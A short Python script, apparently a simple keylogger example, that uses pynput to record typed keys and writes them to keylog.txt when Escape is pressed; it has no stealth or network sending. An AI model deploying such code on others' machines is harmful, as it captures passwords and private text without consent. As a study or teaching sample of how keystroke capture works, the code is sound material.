from pynput import keyboard

logged_keys = ""


def on_press(key):
    global logged_keys
    try:
        logged_keys += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys += " "
        elif key == keyboard.Key.enter:
            logged_keys += "\n"
        elif key == keyboard.Key.esc: 
            with open("keylog.txt", "w") as file:
                file.write(logged_keys)
            return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
